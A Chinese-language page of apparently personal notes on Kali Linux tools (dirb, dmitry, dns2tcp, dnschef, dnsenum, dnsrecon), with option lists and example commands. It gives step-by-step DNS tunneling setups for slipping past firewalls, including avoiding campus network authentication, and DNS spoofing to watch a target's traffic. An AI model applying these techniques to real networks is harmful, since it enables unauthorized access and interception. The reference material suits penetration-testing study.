&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt </p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411145427811.png" alt="image-20220411145427811"></p><p>2.设置UA和cookie</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.116</span> -a <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span> -c <span class="hljs-string">&quot;BAIDUID=D5C6351DAC89EF8811A51DF3A9A9C0C4:FG=1; HMACCOUNT=2906306413846532; BIDUPSID=D5C6351DAC89EF8811A51DF3A9A9C0C4; PSTM=1585744543; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; H_PS_PSSID=30974_1438_31124_21098; HMVT=6bcd52f51e9b3dce32bec4a3997715ac|1587436663|; delPer=0; PSINO=6; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411145505749.png" alt="image-20220411145505749"></p><p>3.对每个字典添加.dist后缀并延迟100毫米</p><p>dirb <a href="http://192.168.1.116/">http://192.168.1.116</a>  -X .dist -z 100 -o test.txt</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411145534821.png" alt="image-20220411145534821"></p><p>4.使用代理</p><p>dirb <a href="http://192.168.1.116/">http://192.168.1.116</a>  -p 46.17.45.194:5210</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411153431885.png" alt="image-20220411153431885"></p><h2 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h2><p>扫描Web目录，可以发现潜在的渗透目标。不同于网站爬虫，使用字典方式可以发现网站没有关联的网页。Kali Linux提供一款基于字典的Web目录扫描工具DIRB。该工具根据用户提供的字典，对目标网站目录进行暴力猜测。它会尝试以递归方式进行爆破，以发现更多的路径。同时，该工具支持代理、HTTP认证扫描限制访问的网站。该工具还提供两个命令，帮助用户从网页生成字典，或者生成定制字典。<br>DirBuster是一个多线程的基于Java的应用程序设计蛮力Web &#x2F;应用服务器上的目录和文件名 。<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411153729784.png" alt="image-20220411153729784"></p><p>或者如下如标注：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411153752936.png" alt="image-20220411153752936"></p><p>御剑怎么用 它就怎么用</p><h2 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h2><p> <strong>Dmitry是一个由C语言编写的UNIX&#x2F;(GNU)Linux命令行工具，它可用于收集主机相关信息，比如子域名、Email地址、系统运行时间信息。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">-o filename<br>创建结果的ascii文本输出到指定的文件名。 如果未指定输出文件名，则输出将保存到“ target.txt”。 如果未以任何形式指定此选项，则默认情况下，输出将发送到标准输出（STDOUT）。 此选项必须尾随所有其他选项，即“ Dmitry -winseo target”。<br><br>-i<br>在目标IP地址上执行Internet号码whois查找<br><br>-w<br>在主机目标上执行whois查找<br><br>-n<br>检索有关主机的netcraft.com数据，其中包括操作系统，Web服务器版本和正常运行时间信息（如果可用）。<br><br>-s<br>在指定的目标上执行子域搜索。 这将使用服务器搜索引擎尝试以sub.target形式查找子域。 可以定位的子域级别没有设置限制，但是，最大字符串长度为40个字符（NCOL 40）以限制内存使用。然后，如果可能的子域返回正数，则可能会将其替换为IP地址 但是，如果主机在其DNS记录中使用星号，则所有解析的子域都将返回正值。<br><br>-e<br>在指定的目标上执行电子邮件地址搜索。 通过尝试查找目标主机的可能电子邮件地址，此模块使用与子域搜索相同的概念来工作。 电子邮件地址也可以用于目标主机的可能子域。 电子邮件地址的长度限制为50个字符（NCOL 50），以限制内存使用。<br><br>-p<br>在主机目标上执行TCP端口扫描。 该模块将列出特定范围内的打开，关闭和过滤端口。<br><br>-f<br>此选项将导致TCP portscan模块报告/显示已过滤端口的输出。 这些通常是已由指定主机/目标上的防火墙过滤和/或关闭的端口。 此选项要求将<span class="hljs-string">&#x27;-p&#x27;</span>选项作为上一个选项传递。 例如，“ dmitry -pf target”。<br><br>-b<br>如果在扫描TCP端口时收到横幅，则此选项将导致TCP portcan模块输出横幅。 此选项要求将<span class="hljs-string">&#x27;-p&#x27;</span>选项作为上一个选项传递。 例如，“ dmitry -pb目标”。<br><br>-t<br>这将设置扫描单个端口时portscan模块的生存时间（TTL）。 默认设置为2秒。扫描具有防火墙和/或具有筛选端口的主机可能会降低扫描速度，通常这是必需的。<br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411154622000.png" alt="image-20220411154622000"></p><h2 id="dns2tcpc"><a href="#dns2tcpc" class="headerlink" title="dns2tcpc"></a>dns2tcpc</h2><p><strong>dns2tcp是一款利用dns协议传输tcp数据的工具。</strong></p><h3 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用<strong>条件</strong></h3><p><strong>客户端的防火墙禁止tcp出站流量，无法上网，dns2tcp利用dns协议传输tcp数据，从而实现上网(dns协议是udp协议走53端口)</strong></p><p>通过dns2tcp绕过校园网认证进行免费上网  前提是学校的这些端口打开了</p><p><a href="https://zhuanlan.zhihu.com/p/354115958">https://zhuanlan.zhihu.com/p/354115958</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-c   大流量压缩<br><br>-F    前台运行<br><br>-f     指定配置文件<br><br>-r    指定使用的资源<br><br>-z    指定DNS域名<br><br>-k    设置传输密码<br><br>-l     侦听本地端口<br><br>-d   编译水平(1 | 2 |3 )   <br></code></pre></td></tr></table></figure><h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p><strong>1.在windows 2003 配置DNS服务器</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155410879.png" alt="image-20220411155410879"></p><p><strong>修改服务器 &#x2F;etc&#x2F;dns2tcpd.conf配置文件</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155425795.png" alt="image-20220411155425795"></p><h3 id="实例演示-建立隧道"><a href="#实例演示-建立隧道" class="headerlink" title="实例演示-建立隧道"></a>实例演示-建立隧道</h3><p><strong>1.服务器运行以下命令，侦听53端口，启动配置文件里所配置的资源，等待客户端来连接。</strong></p><p>dns2tcpd -F -d 1 -f &#x2F;etc&#x2F;dns2tcpd.conf</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155438325.png" alt="image-20220411155438325"></p><p>2.客户端运行以下命令，侦听本地7002端口，使用ssh资源，如果有数据产生，将通过DNS服务器将数据发给服务器。</p><p> 这样我们的7002端口，就跟目标53端口建立了隧道。</p><p>dns2tcpc -c -k pass -d 1  -l 7002 -r ssh  -z   lab.test.com<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155626877.png" alt="image-20220411155626877"></p><p><strong>3.使用ssh连接本地7002端口，也就是连接服务器53端口，然后服务器在转发给22端口。</strong></p><p>ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#46;&#x31;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#46;&#x31;</a> -p 7002</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155724135.png" alt="image-20220411155724135"></p><p><strong>4.这里我们也可以结合ssh动态端口转发命令，就可以配置浏览器进行代理上网。</strong></p><p> ssh -CfNg -D 8080 <a href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;">&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;</a> -p 7002</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155751342.png" alt="image-20220411155751342"></p><h2 id="dns2tcpd"><a href="#dns2tcpd" class="headerlink" title="dns2tcpd"></a>dns2tcpd</h2><p>有些网络的防火墙设置只允许端口53的UDP流量，就不能通过tcp搭建隧道，这种情况下我们可以通过UDP搭建DNS隧道，通过搭建一个DNS服务器委派的子域，这个子域因为使我们自己搭建的主机，这时候就可以通过这个子域搭建DNS隧道，和网络被限制的主机1交互。</p><p>主机3为DNS服务器需要设置为固定的IP地址</p><p>它的原理是通过DNS请求头域名的信息 TXT记录加密传输信息，我们可以通过抓取DNS隧道数据包，可以看到DNS的查询请求的域名信息test.lab.com前的一串数据，里面就是加密过后的交互数据。DNS隧道建立后，客户端（主机1）还是会不断地发包给服务器端（主机2），类似心跳一样，确认服务器端处于存活状态，保证传输的顺畅。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411155942288.png" alt="image-20220411155942288"></p><p>在主机3上搭建一个DNS服务器，并委派一个子域给主机2，配置转发器，除test.lab.com之外的域名用别的域名地址解析</p><p><strong>搭建DNS隧道</strong></p><p>在主机2</p><p>修改dns2tcpd的配置</p><p>vim &#x2F;etc&#x2F;dns2tcpd.conf </p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160009476.png" alt="image-20220411160009476"></p><p>ssh:127.0.0.1:22</p><p>smtp:127.0.0.1:25 </p><p>socks:127.0.0.1:1080</p><p>http:192.168.1.1:80</p><p>https:127.0.0.1:8087</p><p>在DNS服务器主机2上开启ssh,smtp,socks,http,https服务，开放22,25,1080,80,8087端口</p><p>配置一下ssh，使其能够在root权限下使用</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160029520.png" alt="image-20220411160029520"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160336705.png" alt="image-20220411160336705"></p><p>主机2开启ssh服务。</p><p>service ssh start</p><p>主机2开启dns隧道</p><p>dns2tcpd -F -d 1 -f &#x2F;etc&#x2F;dns2tcpd.conf</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160353575.png" alt="image-20220411160353575"></p><p><strong>主机1通过DNS隧道连接主机2使用ssh服务</strong></p><p>dns2tcp -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</p><p>-c 启动流量压缩</p><p>-d debug查看信息</p><p>-l 设置本地侦听端口</p><p>-r 指定资源 </p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420162035102-1491960840.png" alt="img"></p><p>在主机1上访问2222端口就相当于在主机2上访问的22端口</p><p>在主机1另开一个终端</p><p>ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;</a> -p 2222</p><p>主机1就通过ssh登录上了主机2</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420162757415-689164737.png" alt="img"></p><p><strong>主机1通过DNS隧道连接主机2使用http服务</strong></p><p>在主机1上</p><p>输入dns2tcp -c -k pass123 -d 1 -l 2222 -r http -z test.lab.com </p><p>打开浏览器，输入<a href="http://127.0.0.1:2222/%EF%BC%8C%E5%B0%B1%E7%9B%B8%E5%BD%93%E4%BA%8E%E6%98%AF%E5%9C%A8%E4%B8%BB%E6%9C%BA2%E4%B8%8A%E8%AE%BF%E9%97%AE192.168.1.1%E4%B8%80%E6%A0%B7">http://127.0.0.1:2222/，就相当于是在主机2上访问192.168.1.1一样</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420164139196-1483443963.png" alt="img"></p><p><strong>主机1通过DNS隧道连接主机2使用https服务</strong></p><p>dns2tcp -c -k pass123 -d 1 -l 7001 -r https -z test.lab.com</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420164438384-1962891653.png" alt="img"></p><p><strong>DNS隧道设置网关功能</strong></p><p>DNS隧道是没有网关功能的，假如想将DNS隧道的客户端主机1作为一个网卡的话，先建立一个DNS隧道里再嵌套一个ssh隧道，用ssh隧道作为一个网关使用</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420203325993-158596230.png" alt="img"></p><p>主机3为DNS服务器需要设置为固定的IP地址</p><p>主机2开启ssh服务。</p><p>service ssh start</p><p>主机2开启dns隧道</p><p>dns2tcpd -F -d 1 -f &#x2F;etc&#x2F;dns2tcpd.conf</p><p>主机1通过DNS隧道连接主机2使用ssh服务，将2222端口作为DNS隧道的入口。</p><p>dns2tcpc -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420204504649-1858609251.png" alt="img"></p><p>再再开一个终端，在主机1的DNS隧道里再搭建一个ssh隧道，并作为网关使用</p><p>ssh -CfNg <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;">&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;</a> -p 2222 -D 7002</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420165409149-1250707627.png" alt="img"></p><p> 主机1网关搭建好了，在主机4上打开浏览器设置代理，将主机1的ip和端口作为代理</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420165714587-1734841986.png" alt="img"></p><p> 然后主机4就能上网了，就相当于在主机2上网差不多。</p><p> <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170420165734571-87993191.png" alt="img"></p><p><strong>通过内网的DNS服务器与外网DNS建立DNS隧道</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1013528-20170421111430915-1519756335.png" alt="img"></p><p>主机1和主机3作为DNS服务器，作为DNS服务器IP地址需要设置为固定的IP地址，主机1的DNS配置上只做转发，将所有的DNS请求都转发给192.168.1.10，主机3委派子域给主机2的ip192.168.1.110，设置域名为test.lab.com</p><p>在主机2，停掉openvas防止占用一些特定的端口</p><p>开启DNS隧道</p><p>dns2tcp -F -d 1 -f &#x2F;etc&#x2F;dns2tcpd.conf</p><p>开启ssh</p><p>service ssh start</p><p>安装squid3</p><p>apt-get install squid3</p><p>开启squid</p><p>service squid start</p><p>在主机4，将DNS地址设置为内网中DNS服务器的ip地址，也就是主机1的ip：1.1.1.11</p><p>修改DNS sudo vi &#x2F;etc&#x2F;resolv.conf</p><p>nameserver 1.1.1.11</p><p>连接隧道</p><p>dns2tcpc -c -k <password> -d 1 -l 8080 -r http -z test.lab.com</p><p>浏览器的代理设置为127.0.0.1:8080，便能上网了，和在主机2上上网一样。</p><h2 id="dnschef"><a href="#dnschef" class="headerlink" title="dnschef"></a>dnschef</h2><p><strong>DNSChef是一个高度可配置的DNS代理，用于渗透测试和恶意软件分析。DNS代理（又名“假DNS”），可用于<strong><strong>分析用户间传输的</strong></strong>网络流量。</strong>例如，我们可以使用一个DNS代理伪造所有到“badguy.com”的请求至本地计算机，进而对流量进行分析。</p><p>就是说代理完之后  靶机电脑有关网络的操作 你都看得到</p><p>一、设置DNS代理</p><p>1.首先将计算机设置为使用DNS名称服务器工具。</p><p>Linux：</p><p>vim &#x2F;etc&#x2F;resolv.conf</p><p>nameserver 127.0.0.1(如果在本地运行)</p><p>Windows：</p><p>控制面板\所有控制面板项\网络和共享中心</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160534687.png" alt="image-20220411160534687"></p><p>属性–TCP&#x2F;IPv4</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160547775.png" alt="image-20220411160547775"></p><p>二、运行DNSChef</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160607531.png" alt="image-20220411160607531"></p><p>查询一个域的”A”记录</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160637676.png" alt="image-20220411160637676"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411160643299.png" alt="image-20220411160643299"></p><p>三、拦截所有响应</p><p>使用–fakeip参数修改域名指向IP</p><p>dnschef –fakeip&#x3D;127.0.0.1</p><p>四、过滤域</p><p>dnschef –fakedomains baidu.com –fakeip 127.0.0.1：所有请求baidu.com转到127.0.0.1，</p><p>五、反向过滤</p><p>dnschef –fakeip&#x3D;127.0.0.1 truedomains baidu.com：只有baidu.com匹配为真实地址，其他的都为127.0.0.1</p><p>六、外部定义文件</p><p>domain &#x3D; ip对的集合，使用空格隔开。</p><p>dnschef –file 文件名</p><p>七、其他的配置</p><p>1.–interface | -i参数指定在其他的端口监听DNSChef。</p><p>2.–nameservers参数指定名称服务器，默认为8.8.8.8。多个使用”,”隔开</p><p>3.-p参数指定开启的端口监听DNS请求</p><p>4.-q参数不显示头部</p><p>5.-t | –tcp使用tcp DNS 代理</p><h2 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h2><p>dnsenum是一款非常强大的 <a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">域名</a>信息收集工具，它是由参与<a href="https://baike.baidu.com/item/backtrack/2964400">backtrack</a> 开发项目的程序员所设计，设计者名叫Fillp (barbsie) Waeythens ，该名开发者是一个精通web渗透测试的安全人员，并对DNS信息收集有着非常丰富的经验。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>dnsenum的目的是尽可能收集一个域的信息，它能够通过谷歌或者<a href="https://baike.baidu.com/item/%E5%AD%97%E5%85%B8">字典</a>文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息、<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8/9705133">域名服务器</a>、mx record（函件交换记录），在域名服务器上执行axfr请求，通过<a href="https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C">谷歌</a>脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行<a href="https://baike.baidu.com/item/whois">whois</a>查询，执行反向查询，把地址段写入文件。</p><p>DNSenum是一款dns查询工具。它能够通过Google或字典文件猜测可能存在的域名，并对一个网段进行反向查询。<br>它不仅可以查询网站的主机地址信息，域名服务器和邮件交换记录，还可以在域名服务器上执行axfr（区域传送）请求，然后通过Google脚步得到扩展域名信息，提取子域名并查询，最后计算IP地址并执行whois查询，执行反向查询，把地址写入文件。</p><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">–enum 相当于–threads 5 -s 15 -w.<br>-v 详细显示所有进度和所有错误消息，加上-v会很慢，会动态的进行记录扫描，产生消息过多<br>-w 执行whois查询<br>-o [file] 以XML格式输出到指定文件中，方便之后查询<br>-t/ --<span class="hljs-built_in">timeout</span> 超时设置，可以提高速度但可能会影响查询结果<br></code></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>1.对sina.com(新浪) 实现dns查询<br>命令： <strong>dnsenum –enum sina.com</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411172234667.png" alt="image-20220411172234667"></p><p>基本的域名IP信息。<br>IN:INTERNET,表示资源都在Internet上</p><p>A记录代表”主机名称”与”IP”地址的对应关系， 作用是把名称转换成IP地址，意思是说该主机的IP对应之意！DNS使用A记录来回答”某主机名称所对应的IP地址是什么？”主机名必须使用A记录转译成IP地址，网络层才知道如何选择路由，并将数据包送到目的地.你要知道的是A就代表了将域名转换成ip，现在好多的工具都有这个功能。<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411172523680.png" alt="image-20220411172523680"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411172549590.png" alt="image-20220411172549590"></p><p>对sina.com进行区域传送，结果基本为refused，现在绝大部分dns服务器对区域传送进行了严格的限制，不过尝试一切能够尝试的，才能得到甘甜的果实。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">区域传送:在本域的各个域名服务器之间进行信息的同步<br>像这样:<br>dig @ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> example<span class="hljs-selector-class">.com</span> axfr  <br></code></pre></td></tr></table></figure><p>如下图</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411173127728.png" alt="image-20220411173127728"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411172615318.png" alt="image-20220411172615318"></p><p>这里是dnsenum进行Google脚步搜索，这里未连接到Google自然就无法使用这个功能。<br>\2. 使用字典文件进行dns查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnsenum --noreverse -f /usr/share/dnsenum/dns.txt sina.com<br></code></pre></td></tr></table></figure><p>在kali Linux中&#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;中<br>前面和上面例子一样</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411174312296.png" alt="image-20220411174312296"></p><p>子域名暴力查询部分<br>CNAME（别名）： 用于将DNS域名的别名映射到另一个主要的或规范的名称 。意思就是通过CNAME将你访问的没有IP地址的域名间接的变成访问另外一个主机。比如你要访问上图的ads.sina.com实际访问的时候，就变成了访问ww1.sinaimg.cn.w.alikunlun.com，它只是起到一个映射的功能。<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411174343088.png" alt="image-20220411174343088"></p><p>C类IP地址</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411174403222.png" alt="image-20220411174403222"></p><p>IP块<br>由于dnsenum会使用反向查询IP地址，所以使用–noreserve跳过这个过程以加快查询速度。</p><h2 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h2><p>由Carlos Perez 用Python开发，用于DNS侦察。</p><h3 id="此工具可以完成下面的操作"><a href="#此工具可以完成下面的操作" class="headerlink" title="此工具可以完成下面的操作:"></a>此工具可以完成下面的操作:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">区域传输 ---- Zone Transfer<br>反向查询 ---- Reverse Lookup<br>暴力猜解 ---- Domain and Host Brute-Force<br>标准记录枚举 ---- Standard Record Enumeration (wildcard,SOA,MX,A,TXT etc.)<br>缓存窥探 ---- Cache Snooping<br>区域遍历 ---- Zone Walking<br>Google查询 ---- Google Lookup<br></code></pre></td></tr></table></figure><h3 id="用法"><a href="#用法" class="headerlink" title="用法:"></a>用法:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h, --<span class="hljs-built_in">help</span>                                       打印帮助信息并退出<br><br> -d, --domain      &lt;domain&gt;          目标域名<br><br> -r, --range       &lt;range&gt;                对给定格式的IP范围进行爆破，格式为(开始IP-结束IP)或(范围/掩码).<br><br> -n, --name_server &lt;name&gt;          指定一个域名服务器<br><br> -D, --dictionary  &lt;file&gt;                 用来爆破的子域名与主机名字典文件<br><br> -f                                                   在保存结果时忽略枚举域查找结果<br><br> -t, --<span class="hljs-built_in">type</span>        &lt;types&gt;    指定枚举类型：<br><br>                              std                如果NS服务器的域传送失败，进行SOA、NS、A、AAAA、MX 和 SRV的枚举(必须使用-d参数指定域名才可使用此参数)<br><br>                              rvl                 对给定的IP范围或CIDR进行反向查找(必须使用-r指定IP范围)<br><br>                              brt                使用指定的字典爆破域名与主机名<br><br>                              srv                枚举SRV记录<br><br>                              axfr               对所有的NS服务器进行域传送测试<br><br>                              goo               对子域名和host进行Google搜索<br><br>                              snoop           对-D选项给出的文件进行DNS服务器缓存侦测<br><br>                              tld                 删除给定域的TLD并测试在IANA中注册的所有的TLD<br><br>                              zonewalk      使用NSEC记录进行DNSSEC域漫游<br><br> -a                          在标准枚举过程中进行空间域传送测试<br><br> -s                          在标准枚举过程中进行IP地址范围的反向查找<br><br> -g                         在标准枚举的过程中进行Google枚举<br><br> -w                         在标准枚举的过程中进行深度whois查询和IP反查<br><br> -z                          在标准枚举的过程中进行DNSSEC域漫游<br><br> --threads         &lt;number&gt;       指定线程数<br><br> --lifetime        &lt;number&gt;       指定查询等待的时间<br><br> --db              &lt;file&gt;                 将结果存储为sqlite3数据库的文件<br><br> --xml             &lt;file&gt;                 将结果存储为XML格式的文件<br><br> --iw                                          即使发现了通配符也依然爆破<br><br> -c, --csv         &lt;file&gt;                 CSV格式的文件<br><br> -j, --json        &lt;file&gt;                 json文件<br><br> -v                                             显示爆破的过程<br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例:"></a>实例:</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411180210542.png" alt="image-20220411180210542"></p><p>对给定的IP范围进行域名反查</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411180607359.png" alt="image-20220411180607359"></p><h1 id="E"><a href="#E" class="headerlink" title="E"></a>E</h1><h2 id="Exploit-Database"><a href="#Exploit-Database" class="headerlink" title="Exploit Database"></a>Exploit Database</h2><p>实时外网渗透实例</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411180850649.png" alt="image-20220411180850649"></p><h2 id="Engrampa-归档管理器"><a href="#Engrampa-归档管理器" class="headerlink" title="Engrampa 归档管理器"></a>Engrampa 归档管理器</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411182946712.png" alt="image-20220411182946712"></p><p>就是看压缩包的软件</p><h2 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h2><p>描述:</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411183237570.png" 